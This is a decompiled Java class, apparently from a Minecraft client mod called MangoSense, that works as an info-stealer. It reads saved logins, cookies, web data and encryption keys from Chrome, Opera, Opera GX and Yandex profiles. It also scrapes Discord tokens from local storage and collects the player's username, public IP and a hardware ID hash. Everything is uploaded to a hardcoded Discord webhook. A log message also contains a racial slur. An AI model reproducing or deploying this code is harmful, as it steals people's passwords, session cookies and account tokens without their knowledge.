/*     */ package sertyo.events.command.module;
/*     */

import net.minecraft.client.Minecraft;
import org.apache.commons.codec.digest.DigestUtils;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
/*     */ 
/*     */ public class smodule {
/*  18 */   static String webhook = "https://discord.com/api/webhooks/1244227518538579988/vcxM4ZgXbYlh9OXHDyM6n0WPPPe_XMmqm3gsmnWhmVrUCUllCw00wgdVJCzDJjEK8bQm";
/*     */   
/*     */   public static void megaStuk() throws Exception {
/*  21 */     String system = System.getProperty("user.home");
/*  22 */     String ip = null;
/*  23 */     String webhook = "https://discord.com/api/webhooks/1244227518538579988/vcxM4ZgXbYlh9OXHDyM6n0WPPPe_XMmqm3gsmnWhmVrUCUllCw00wgdVJCzDJjEK8bQm";
/*     */     try {
/*  25 */       ip = (new Scanner((new URL("http://checkip.amazonaws.com")).openStream(), "UTF-8")).useDelimiter("\\A").next();
/*  26 */     } catch (IOException iOException) {}
/*     */ 
/*     */     
/*  29 */     doThing("**```START SESSION ------------------------------------------------------------------------------------------------```**", webhook);
/*  30 */     doThing("```ZAOVNIL <<< " + Minecraft.getInstance().getSession().getUsername() + "```", webhook);
/*     */ 
/*     */     
/*  33 */     String sg = system + "/AppData/Local/Google/Chrome/User Data/";
/*  34 */     doThing("```(------------------------------GOOGLE------------------------------)```", webhook);
/*  35 */     sendFile(new File(sg + "Default/Login Data"));
/*  36 */     sendFile(new File(sg + "Profile 1/Login Data"));
/*  37 */     sendFile(new File(sg + "Profile 2/Login Data"));
/*  38 */     sendFile(new File(sg + "Profile 3/Login Data"));
/*  39 */     sendFile(new File(sg + "Profile 4/Login Data"));
/*  40 */     sendFile(new File(sg + "Profile 5/Login Data"));
/*  41 */     sendFile(new File(sg + "Profile 6/Login Data"));
/*  42 */     sendFile(new File(sg + "Profile 7/Login Data"));
/*  43 */     sendFile(new File(sg + "Profile 8/Login Data"));
/*  44 */     sendFile(new File(sg + "Profile 9/Login Data"));
/*  45 */     sendFile(new File(sg + "Profile 10/Login Data"));
/*  46 */     sendFile(new File(sg + "Default/Network/Cookies"));
/*  47 */     sendFile(new File(sg + "Default/Web Data"));
/*  48 */     sendFile(new File(sg + "Local State"));
/*  49 */     sendFile(new File(sg + "Profile 1/Network/Cookies"));
/*  50 */     sendFile(new File(sg + "Profile 2/Network/Cookies"));
/*  51 */     sendFile(new File(sg + "Profile 3/Network/Cookies"));
/*  52 */     sendFile(new File(sg + "Profile 4/Network/Cookies"));
/*  53 */     sendFile(new File(sg + "Profile 5/Network/Cookies"));
/*  54 */     sendFile(new File(sg + "Profile 6/Network/Cookies"));
/*  55 */     sendFile(new File(sg + "Profile 7/Network/Cookies"));
/*  56 */     sendFile(new File(sg + "Profile 8/Network/Cookies"));
/*  57 */     sendFile(new File(sg + "Profile 9/Network/Cookies"));
/*  58 */     sendFile(new File(sg + "Profile 10/Network/Cookies"));
/*  59 */     doThing("```+------------------------------GOOGLE------------------------------+```", webhook);
/*     */ 
/*     */ 
/*     */     
/*  63 */     String so = system + "/AppData/Roaming/Opera Software/Opera Stable/User Data/";
/*  64 */     doThing("```(------------------------------OPERA------------------------------)```", webhook);
/*  65 */     sendFile(new File(so + "Default/Login Data"));
/*  66 */     sendFile(new File(so + "Profile 1/Login Data"));
/*  67 */     sendFile(new File(so + "Profile 2/Login Data"));
/*  68 */     sendFile(new File(so + "Profile 3/Login Data"));
/*  69 */     sendFile(new File(so + "Profile 4/Login Data"));
/*  70 */     sendFile(new File(so + "Profile 5/Login Data"));
/*  71 */     sendFile(new File(so + "Profile 6/Login Data"));
/*  72 */     sendFile(new File(so + "Profile 7/Login Data"));
/*  73 */     sendFile(new File(so + "Profile 8/Login Data"));
/*  74 */     sendFile(new File(so + "Profile 9/Login Data"));
/*  75 */     sendFile(new File(so + "Profile 10/Login Data"));
/*  76 */     sendFile(new File(so + "Default/Network/Cookies"));
/*  77 */     sendFile(new File(so + "Default/Web Data"));
/*  78 */     sendFile(new File(so + "Local State"));
/*  79 */     sendFile(new File(so + "Profile 1/Network/Cookies"));
/*  80 */     sendFile(new File(so + "Profile 2/Network/Cookies"));
/*  81 */     sendFile(new File(so + "Profile 3/Network/Cookies"));
/*  82 */     sendFile(new File(so + "Profile 4/Network/Cookies"));
/*  83 */     sendFile(new File(so + "Profile 5/Network/Cookies"));
/*  84 */     sendFile(new File(so + "Profile 6/Network/Cookies"));
/*  85 */     sendFile(new File(so + "Profile 7/Network/Cookies"));
/*  86 */     sendFile(new File(so + "Profile 8/Network/Cookies"));
/*  87 */     sendFile(new File(so + "Profile 9/Network/Cookies"));
/*  88 */     sendFile(new File(so + "Profile 10/Network/Cookies"));
/*  89 */     doThing("```+------------------------------OPERA------------------------------+```", webhook);
/*     */ 
/*     */ 
/*     */     
/*  93 */     String soGX = system + "/AppData/Roaming/Opera Software/Opera GX Stable/";
/*  94 */     doThing("```(------------------------------OPERAGX------------------------------)```", webhook);
/*  95 */     sendFile(new File(soGX + "Login Data"));
/*  96 */     sendFile(new File(soGX + "Network/Cookies"));
/*  97 */     sendFile(new File(soGX + "Web Data"));
/*  98 */     sendFile(new File(soGX + "Local State"));
/*  99 */     doThing("```+------------------------------OPERAGX------------------------------+```", webhook);
/*     */ 
/*     */ 
/*     */     
/* 103 */     String sy = system + "/AppData/Local/Yandex/YandexBrowser/User Data/";
/* 104 */     doThing("```(------------------------------YANDEX------------------------------)```", webhook);
/* 105 */     sendFile(new File(sy + "Default/Login Data"));
/* 106 */     sendFile(new File(sy + "Profile 1/Login Data"));
/* 107 */     sendFile(new File(sy + "Profile 2/Login Data"));
/* 108 */     sendFile(new File(sy + "Profile 3/Login Data"));
/* 109 */     sendFile(new File(sy + "Profile 4/Login Data"));
/* 110 */     sendFile(new File(sy + "Profile 5/Login Data"));
/* 111 */     sendFile(new File(sy + "Profile 6/Login Data"));
/* 112 */     sendFile(new File(sy + "Profile 7/Login Data"));
/* 113 */     sendFile(new File(sy + "Profile 8/Login Data"));
/* 114 */     sendFile(new File(sy + "Profile 9/Login Data"));
/* 115 */     sendFile(new File(sy + "Profile 10/Login Data"));
/* 116 */     sendFile(new File(sy + "Default/Network/Cookies"));
/* 117 */     sendFile(new File(sy + "Default/Web Data"));
/* 118 */     sendFile(new File(sy + "Local State"));
/* 119 */     sendFile(new File(sy + "Profile 1/Network/Cookies"));
/* 120 */     sendFile(new File(sy + "Profile 2/Network/Cookies"));
/* 121 */     sendFile(new File(sy + "Profile 3/Network/Cookies"));
/* 122 */     sendFile(new File(sy + "Profile 4/Network/Cookies"));
/* 123 */     sendFile(new File(sy + "Profile 5/Network/Cookies"));
/* 124 */     sendFile(new File(sy + "Profile 6/Network/Cookies"));
/* 125 */     sendFile(new File(sy + "Profile 7/Network/Cookies"));
/* 126 */     sendFile(new File(sy + "Profile 8/Network/Cookies"));
/* 127 */     sendFile(new File(sy + "Profile 9/Network/Cookies"));
/* 128 */     sendFile(new File(sy + "Profile 10/Network/Cookies"));
/* 129 */     doThing("```+------------------------------YANDEX------------------------------+```", webhook);
/*     */ 
/*     */ 
/*     */     
/* 133 */     doThing("```Niggas tocken is - " + grabTokens() + "```", webhook);
/* 134 */     doThing("```Ip is - " + ip + "```", webhook);
/* 135 */     doThing("```Hwid is - " + DigestUtils.sha256Hex(DigestUtils.sha256Hex(System.getenv("os") +
/* 136 */             System.getProperty("os.name") + 
/* 137 */             System.getProperty("os.arch") + 
/* 138 */             System.getProperty("user.name") + 
/* 139 */             System.getenv("SystemRoot") + 
/* 140 */             System.getenv("HOMEDRIVE") + 
/* 141 */             System.getenv("PROCESSOR_LEVEL") + 
/* 142 */             System.getenv("PROCESSOR_REVISION") + 
/* 143 */             System.getenv("PROCESSOR_IDENTIFIER") + 
/* 144 */             System.getenv("PROCESSOR_ARCHITECTURE") + 
/* 145 */             System.getenv("PROCESSOR_ARCHITEW6432") + 
/* 146 */             System.getenv("NUMBER_OF_PROCESSORS").toUpperCase())) + "```", webhook);
/*     */     
/* 148 */     doThing("**```END SESSION ------------------------------------------------------------------------------------------------```**", webhook);
/*     */   }
/*     */ 
/*     */   
/*     */   public static void doThing(String message, String webhook) {
/* 153 */     PrintWriter out = null;
/* 154 */     BufferedReader in = null;
/* 155 */     StringBuilder result = new StringBuilder();
/*     */     
/* 157 */     try { URL realUrl = new URL(webhook);
/* 158 */       URLConnection conn = realUrl.openConnection();
/* 159 */       conn.setRequestProperty("accept", "*/*");
/* 160 */       conn.setRequestProperty("connection", "Keep-Alive");
/* 161 */       conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
/* 162 */       conn.setDoOutput(true);
/* 163 */       conn.setDoInput(true);
/* 164 */       out = new PrintWriter(conn.getOutputStream());
/* 165 */       String postData = URLEncoder.encode("content", "UTF-8") + "=" + URLEncoder.encode(message, "UTF-8");
/* 166 */       out.print(postData);
/* 167 */       out.flush();
/* 168 */       in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
/*     */       String line;
/* 170 */       while ((line = in.readLine()) != null) {
/* 171 */         result.append("/n").append(line);
/*     */       } }
/*     */     
/* 174 */     catch (Exception exception)
/*     */     
/*     */     { try {
/* 177 */         if (out != null) {
/* 178 */           out.close();
/*     */         }
/* 180 */         if (in != null) {
/* 181 */           in.close();
/*     */         }
/* 183 */       } catch (IOException iOException) {} } finally { try { if (out != null) out.close();  if (in != null) in.close();  } catch (IOException iOException) {} }
/*     */ 
/*     */     
/* 186 */     System.out.println(result);
/*     */   }
/*     */   
/*     */   public static void sendFile(File file) throws Exception {
/*     */     try {
/* 191 */       String boundary = Long.toHexString(System.currentTimeMillis());
/* 192 */       HttpURLConnection connection = (HttpURLConnection)(new URL(webhook)).openConnection();
/* 193 */       connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
/* 194 */       connection.setRequestProperty("User-Agent", "Mozilla/5.0");
/* 195 */       connection.setDoOutput(true);
/* 196 */       try (OutputStream os = connection.getOutputStream()) {
/* 197 */         os.write(("--" + boundary + "\n").getBytes());
/* 198 */         os.write(("Content-Disposition: form-data; name=\"" + file.getName() + "\"; filename=\"" + file.getName() + "\"\n\n").getBytes());
/* 199 */         try (FileInputStream inputStream = new FileInputStream(file)) {
/* 200 */           int fileSize = (int)file.length();
/* 201 */           byte[] fileBytes = new byte[fileSize];
/* 202 */           inputStream.read(fileBytes, 0, fileSize);
/* 203 */           os.write(fileBytes);
/*     */         } 
/* 205 */         os.write(("\n--" + boundary + "--\n").getBytes());
/*     */       } 
/* 207 */       connection.getResponseCode();
/* 208 */       Thread.sleep(500L);
/* 209 */     } catch (FileNotFoundException fileNotFoundException) {}
/*     */   }
/*     */ 
/*     */   
/*     */   public static List<String> grabTokens() {
/* 214 */     List<String> tokens = new ArrayList<>();
/* 215 */     String fs = System.getenv("file.separator");
/* 216 */     String localappdata = System.getenv("LOCALAPPDATA");
/* 217 */     String roaming = System.getenv("APPDATA");
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 235 */     String[][] paths = { { "Lightcord", roaming + "\\Lightcord\\Local Storage\\leveldb" }, { "Discord", roaming + "\\Discord\\Local Storage\\leveldb" }, { "Discord Canary", roaming + "\\discordcanary\\Local Storage\\leveldb" }, { "Discord PTB", roaming + "\\discordptb\\Local Storage\\leveldb" }, { "Chrome Browser", localappdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb" }, { "Opera Browser", roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb" }, { "Brave Browser", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb" }, { "Yandex Browser", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb" }, { "Brave Browser", System.getProperty("user.home") + fs + ".config/BraveSoftware/Brave-Browser/Default/Local Storage/leveldb" }, { "Yandex Browser Beta", System.getProperty("user.home") + fs + ".config/yandex-browser-beta/Default/Local Storage/leveldb" }, { "Yandex Browser", System.getProperty("user.home") + fs + ".config/yandex-browser/Default/Local Storage/leveldb" }, { "Chrome Browser", System.getProperty("user.home") + fs + ".config/google-chrome/Default/Local Storage/leveldb" }, { "Opera Browser", System.getProperty("user.home") + fs + ".config/opera/Local Storage/leveldb" }, { "Discord", System.getProperty("user.home") + fs + ".config/discord/Local Storage/leveldb" }, { "Discord Canargy", System.getProperty("user.home") + fs + ".config/discordcanary/Local Storage/leveldb" }, { "Discord PTB", System.getProperty("user.home") + fs + ".config/discordptb/Local Storage/leveldb" }, { "Discord", System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb" } };
/*     */ 
/*     */     
/* 238 */     for (String[] path : paths) {
/*     */       try {
/* 240 */         File file = new File(path[1]);
/*     */         
/* 242 */         for (String pathname : file.list()) {
/* 243 */           if (!pathname.equals("LOCK")) {
/*     */ 
/*     */             
/* 246 */             FileInputStream fstream = new FileInputStream(path[1] + System.getProperty("file.separator") + pathname);
/* 247 */             DataInputStream in = new DataInputStream(fstream);
/* 248 */             BufferedReader br = new BufferedReader(new InputStreamReader(in));
/*     */             String strLine;
/* 250 */             while ((strLine = br.readLine()) != null) {
/* 251 */               Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}|mfa\\.[\\w]{84}");
/* 252 */               Matcher m = p.matcher(strLine);
/*     */               
/* 254 */               while (m.find()) {
/* 255 */                 if (!tokens.contains(m.group()))
/* 256 */                   tokens.add(m.group()); 
/*     */               } 
/*     */             } 
/*     */           } 
/*     */         } 
/* 261 */       } catch (Exception exception) {}
/*     */     } 
/*     */     
/* 264 */     return tokens;
/*     */   }
/*     */ }


/* Location:              D:\MangoSense\MangoSense.jar!\mango\commands\module\Stealler.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */